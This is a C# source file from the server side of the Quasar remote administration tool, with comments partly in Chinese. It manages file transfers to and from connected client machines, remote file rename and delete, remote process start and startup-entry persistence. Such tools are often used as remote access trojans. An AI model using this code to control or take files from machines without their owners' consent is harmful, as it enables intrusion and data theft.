using Quasar.Common.Enums;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Enums;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// 处理与远程文件和目录互动的信息。
    /// </summary>
    public class FileManagerHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// 代表将处理驱动器变化的方法。
        /// </summary>
        /// <param name="sender">引起该事件的消息处理器。</param>
        /// <param name="drives">目前所有可用的驱动器。</param>
        public delegate void DrivesChangedEventHandler(object sender, Drive[] drives);

        /// <summary>
        /// 代表将处理目录变化的方法。
        /// </summary>
        /// <param name="sender">引起该事件的消息处理器。</param>
        /// <param name="remotePath">该目录的远程路径。</param>
        /// <param name="items">目录的内容。</param>
        public delegate void DirectoryChangedEventHandler(object sender, string remotePath, FileSystemEntry[] items);

        /// <summary>
        /// 代表将处理文件传输更新的方法。
        /// </summary>
        /// <param name="sender">引起该事件的消息处理器。</param>
        /// <param name="transfer">更新后的文件传输。</param>
        public delegate void FileTransferUpdatedEventHandler(object sender, FileTransfer transfer);

        /// <summary>
        /// 驱动器改变时提出。
        /// </summary>
        /// <remarks>
        /// 用此事件注册的处理程序将在构建实例时选择的
        /// <see cref="System.Threading.SynchronizationContext"/>上调用。
        /// </remarks>
        public event DrivesChangedEventHandler DrivesChanged;

        /// <summary>
        /// 当一个目录改变时引发。
        /// </summary>
        /// <remarks>
        /// 用此事件注册的处理程序将被调用到 
        /// <see cref="System.Threading.SynchronizationContext"/>构建实例时选择的处理程序。
        /// </remarks>
        public event DirectoryChangedEventHandler DirectoryChanged;

        /// <summary>
        /// 当一个文件传输更新时引发的。
        /// </summary>
        /// <remarks>
        /// 用此事件注册的处理程序将被调用到 
        /// <see cref="System.Threading.SynchronizationContext"/>构建实例时选择的处理程序。
        /// </remarks>
        public event FileTransferUpdatedEventHandler FileTransferUpdated;

        /// <summary>
        /// 报告改变了的远程驱动器。
        /// </summary>
        /// <param name="drives">当前的远程驱动器。</param>
        private void OnDrivesChanged(Drive[] drives)
        {
            SynchronizationContext.Post(d =>
            {
                var handler = DrivesChanged;
                handler?.Invoke(this, (Drive[])d);
            }, drives);
        }

        /// <summary>
        /// 报告一个目录变化。
        /// </summary>
        /// <param name="remotePath">该目录的远程路径。</param>
        /// <param name="items">目录的内容。</param>
        private void OnDirectoryChanged(string remotePath, FileSystemEntry[] items)
        {
            SynchronizationContext.Post(i =>
            {
                var handler = DirectoryChanged;
                handler?.Invoke(this, remotePath, (FileSystemEntry[])i);
            }, items);
        }

        /// <summary>
        /// 报告更新的文件传输。
        /// </summary>
        /// <param name="transfer">更新后的文件传输。</param>
        private void OnFileTransferUpdated(FileTransfer transfer)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = FileTransferUpdated;
                handler?.Invoke(this, (FileTransfer)t);
            }, transfer.Clone());
        }

        /// <summary>
        /// 追踪所有正在进行的文件传输。已完成或取消的传输会被删除。
        /// </summary>
        private readonly List<FileTransfer> _activeFileTransfers = new List<FileTransfer>();

        /// <summary>
        /// 在锁语句中使用，以同步UI线程和线程池之间的访问。
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// 与该文件管理器处理程序相关的客户。
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// 用于只允许同时上传两个文件。
        /// </summary>
        private readonly Semaphore _limitThreads = new Semaphore(2, 2);

        /// <summary>
        /// 客户端基本下载目录的路径。
        /// </summary>
        private readonly string _baseDownloadPath;

        private readonly TaskManagerHandler _taskManagerHandler;

        /// <summary>
        /// 使用给定的客户端初始化一个<see cref="FileManagerHandler"/>类的新实例。
        /// </summary>
        /// <param name="client">相关的客户端。</param>
        /// <param name="subDirectory">可选的子目录名称。</param>
        public FileManagerHandler(Client client, string subDirectory = "") : base(true)
        {
            _client = client;
            _baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, subDirectory);
            _taskManagerHandler = new TaskManagerHandler(client);
            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
            MessageHandler.Register(_taskManagerHandler);
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is FileTransferChunk ||
                                                             message is FileTransferCancel ||
                                                             message is FileTransferComplete ||
                                                             message is GetDrivesResponse ||
                                                             message is GetDirectoryResponse ||
                                                             message is SetStatusFileManager;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case FileTransferChunk file:
                    Execute(sender, file);
                    break;
                case FileTransferCancel cancel:
                    Execute(sender, cancel);
                    break;
                case FileTransferComplete complete:
                    Execute(sender, complete);
                    break;
                case GetDrivesResponse drive:
                    Execute(sender, drive);
                    break;
                case GetDirectoryResponse directory:
                    Execute(sender, directory);
                    break;
                case SetStatusFileManager status:
                    Execute(sender, status);
                    break;
            }
        }

        /// <summary>
        /// 开始从客户端下载一个文件。
        /// </summary>
        /// <param name="remotePath">要下载的文件的远程路径。</param>
        /// <param name="localFileName">本地文件的名称。</param>
        /// <param name="overwrite">用新下载的文件覆盖本地文件。</param>
        public void BeginDownloadFile(string remotePath, string localFileName = "", bool overwrite = false)
        {
            if (string.IsNullOrEmpty(remotePath))
                return;

            int id = GetUniqueFileTransferId();

            if (!Directory.Exists(_baseDownloadPath))
                Directory.CreateDirectory(_baseDownloadPath);

            string fileName = string.IsNullOrEmpty(localFileName) ? Path.GetFileName(remotePath) : localFileName;
            string localPath = Path.Combine(_baseDownloadPath, fileName);

            int i = 1;
            while (!overwrite && File.Exists(localPath))
            {
                // 如果文件已经存在，则重命名该文件
                var newFileName = string.Format("{0}({1}){2}", Path.GetFileNameWithoutExtension(localPath), i, Path.GetExtension(localPath));
                localPath = Path.Combine(_baseDownloadPath, newFileName);
                i++;
            }

            var transfer = new FileTransfer
            {
                Id = id,
                Type = TransferType.Download,
                LocalPath = localPath,
                RemotePath = remotePath,
                Status = "Pending...",
                //Size = fileSize, TODO: 在此添加文件大小
                TransferredSize = 0
            };

            try
            {
                transfer.FileSplit = new FileSplit(transfer.LocalPath, FileAccess.Write);
            }
            catch (Exception)
            {
                transfer.Status = "Error writing file";
                OnFileTransferUpdated(transfer);
                return;
            }

            lock (_syncLock)
            {
                _activeFileTransfers.Add(transfer);
            }

            OnFileTransferUpdated(transfer);

            _client.Send(new FileTransferRequest {RemotePath = remotePath, Id = id});
        }

        /// <summary>
        /// 开始向客户上传文件。
        /// </summary>
        /// <param name="localPath">要上传的文件的本地路径。</param>
        /// <param name="remotePath">保存上传的文件到这个远程路径。如果为空，则生成一个临时文件名。</param>
        public void BeginUploadFile(string localPath, string remotePath = "")
        {
            new Thread(() =>
            {
                int id = GetUniqueFileTransferId();

                FileTransfer transfer = new FileTransfer
                {
                    Id = id,
                    Type = TransferType.Upload,
                    LocalPath = localPath,
                    RemotePath = remotePath,
                    Status = "Pending...",
                    TransferredSize = 0
                };

                try
                {
                    transfer.FileSplit = new FileSplit(localPath, FileAccess.Read);
                }
                catch (Exception)
                {
                    transfer.Status = "Error reading file";
                    OnFileTransferUpdated(transfer);
                    return;
                }

                transfer.Size = transfer.FileSplit.FileSize;

                lock (_syncLock)
                {
                    _activeFileTransfers.Add(transfer);
                }

                transfer.Size = transfer.FileSplit.FileSize;
                OnFileTransferUpdated(transfer);

                _limitThreads.WaitOne();
                try
                {
                    foreach (var chunk in transfer.FileSplit)
                    {
                        transfer.TransferredSize += chunk.Data.Length;
                        decimal progress = Math.Round((decimal) ((double) transfer.TransferredSize / (double) transfer.Size * 100.0), 2);
                        transfer.Status = $"Uploading...({progress}%)";
                        OnFileTransferUpdated(transfer);

                        bool transferCanceled;
                        lock (_syncLock)
                        {
                            transferCanceled = _activeFileTransfers.Count(f => f.Id == transfer.Id) == 0;
                        }

                        if (transferCanceled)
                        {
                            transfer.Status = "Canceled";
                            OnFileTransferUpdated(transfer);
                            _limitThreads.Release();
                            return;
                        }

                        // TODO: blocking sending might not be required, needs further testing
                        _client.SendBlocking(new FileTransferChunk
                        {
                            Id = id,
                            Chunk = chunk,
                            FilePath = remotePath,
                            FileSize = transfer.Size
                        });
                    }
                }
                catch (Exception)
                {
                    lock (_syncLock)
                    {
                        // if transfer is already cancelled, just return
                        if (_activeFileTransfers.Count(f => f.Id == transfer.Id) == 0)
                        {
                            _limitThreads.Release();
                            return;
                        }
                    }
                    transfer.Status = "Error reading file";
                    OnFileTransferUpdated(transfer);
                    CancelFileTransfer(transfer.Id);
                    _limitThreads.Release();
                    return;
                }

                _limitThreads.Release();
            }).Start();
        }

        /// <summary>
        /// Cancels a file transfer.
        /// </summary>
        /// <param name="transferId">The id of the file transfer to cancel.</param>
        public void CancelFileTransfer(int transferId)
        {
            _client.Send(new FileTransferCancel {Id = transferId});
        }

        /// <summary>
        /// Renames a remote file or directory.
        /// </summary>
        /// <param name="remotePath">The remote file or directory path to rename.</param>
        /// <param name="newPath">The new name of the remote file or directory path.</param>
        /// <param name="type">The type of the file (file or directory).</param>
        public void RenameFile(string remotePath, string newPath, FileType type)
        {
            _client.Send(new DoPathRename
            {
                Path = remotePath,
                NewPath = newPath,
                PathType = type
            });
        }

        /// <summary>
        /// Deletes a remote file or directory.
        /// </summary>
        /// <param name="remotePath">The remote file or directory path.</param>
        /// <param name="type">The type of the file (file or directory).</param>
        public void DeleteFile(string remotePath, FileType type)
        {
            _client.Send(new DoPathDelete {Path = remotePath, PathType = type});
        }

        /// <summary>
        /// Starts a new process remotely.
        /// </summary>
        /// <param name="remotePath">The remote path used for starting the new process.</param>
        public void StartProcess(string remotePath)
        {
            _taskManagerHandler.StartProcess(remotePath);
        }

        /// <summary>
        /// Adds an item to the startup of the client.
        /// </summary>
        /// <param name="item">The startup item to add.</param>
        public void AddToStartup(StartupItem item)
        {
            _client.Send(new DoStartupItemAdd {StartupItem = item});
        }

        /// <summary>
        /// Gets the directory contents for the remote path.
        /// </summary>
        /// <param name="remotePath">The remote path of the directory.</param>
        public void GetDirectoryContents(string remotePath)
        {
            _client.Send(new GetDirectory {RemotePath = remotePath});
        }

        /// <summary>
        /// Refreshes the remote drives.
        /// </summary>
        public void RefreshDrives()
        {
            _client.Send(new GetDrives());
        }

        private void Execute(ISender client, FileTransferChunk message)
        {
            FileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }

            if (transfer == null)
                return;

            transfer.Size = message.FileSize;
            transfer.TransferredSize += message.Chunk.Data.Length;

            try
            {
                transfer.FileSplit.WriteChunk(message.Chunk);
            }
            catch (Exception)
            {
                transfer.Status = "Error writing file";
                OnFileTransferUpdated(transfer);
                CancelFileTransfer(transfer.Id);
                return;
            }

            decimal progress = Math.Round((decimal) ((double) transfer.TransferredSize / (double) transfer.Size * 100.0), 2);
            transfer.Status = $"Downloading...({progress}%)";

            OnFileTransferUpdated(transfer);
        }

        private void Execute(ISender client, FileTransferCancel message)
        {
            FileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }

            if (transfer != null)
            {
                transfer.Status = message.Reason;
                OnFileTransferUpdated(transfer);
                RemoveFileTransfer(transfer.Id);
                // don't keep un-finished files
                if (transfer.Type == TransferType.Download)
                    File.Delete(transfer.LocalPath);
            }
        }

        private void Execute(ISender client, FileTransferComplete message)
        {
            FileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }

            if (transfer != null)
            {
                transfer.RemotePath = message.FilePath; // required for temporary file names generated on the client
                transfer.Status = "Completed";
                RemoveFileTransfer(transfer.Id);
                OnFileTransferUpdated(transfer);
            }
        }

        private void Execute(ISender client, GetDrivesResponse message)
        {
            if (message.Drives?.Length == 0)
                return;

            OnDrivesChanged(message.Drives);
        }
        
        private void Execute(ISender client, GetDirectoryResponse message)
        {
            if (message.Items == null)
            {
                message.Items = new FileSystemEntry[0];
            }
            OnDirectoryChanged(message.RemotePath, message.Items);
        }

        private void Execute(ISender client, SetStatusFileManager message)
        {
            OnReport(message.Message);
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            if (action != ProcessAction.Start) return;
            OnReport(result ? "Process started successfully" : "Process failed to start");
        }

        /// <summary>
        /// Removes a file transfer given the transfer id.
        /// </summary>
        /// <param name="transferId">The file transfer id.</param>
        private void RemoveFileTransfer(int transferId)
        {
            lock (_syncLock)
            {
                var transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == transferId);
                transfer?.FileSplit?.Dispose();
                _activeFileTransfers.RemoveAll(s => s.Id == transferId);
            }
        }

        /// <summary>
        /// Generates a unique file transfer id.
        /// </summary>
        /// <returns>A unique file transfer id.</returns>
        private int GetUniqueFileTransferId()
        {
            int id;
            lock (_syncLock)
            {
                do
                {
                    id = FileTransfer.GetRandomTransferId();
                    // generate new id until we have a unique one
                } while (_activeFileTransfers.Any(f => f.Id == id));
            }

            return id;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    foreach (var transfer in _activeFileTransfers)
                    {
                        _client.Send(new FileTransferCancel {Id = transfer.Id});
                        transfer.FileSplit?.Dispose();
                        if (transfer.Type == TransferType.Download)
                            File.Delete(transfer.LocalPath);
                    }

                    _activeFileTransfers.Clear();
                }

                MessageHandler.Unregister(_taskManagerHandler);
                _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
            }
        }
    }
}
